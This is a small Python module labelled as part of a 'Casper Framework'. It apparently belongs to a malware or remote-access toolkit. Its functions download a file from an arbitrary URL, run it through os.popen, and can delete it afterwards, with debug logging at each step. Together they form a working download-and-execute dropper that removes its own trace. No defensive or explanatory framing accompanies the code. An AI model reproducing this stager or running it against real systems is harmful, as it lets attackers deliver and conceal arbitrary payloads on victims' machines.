'''
Part of Casper Framework
'''
from includes import *

def execute(file):
	try:
		process_create = os.popen(file)
		process_result = process_create.read()
		return True
	except Exception as e:
		return False

def download(url,file):
	try:
		urllib.urlretrieve(url,file)
		return True
	except Exception as e:
		return False

def autodelete(file):
	try:
		os.remove(file)
		return True
	except Exception as e:
		return False

def download_execute(url,file,autod):
	if (download(url,file) == True):
		logging.debug("[casper] Successfully downloaded file")
		if (execute(file) == True):
			logging.debug("[casper] Successfully executed file")
			if (autod == 1):
				if (autodelete(file) == True):
					logging.debug("[casper] Successfully deleted the file")
				else:
					logging.debug("[casper] Unable to delete the file")
			else:
				pass
		else:
			logging.debug("[casper] Unable to execute file")
	else:
		logging.debug("[casper] Unable to download file")
	return True
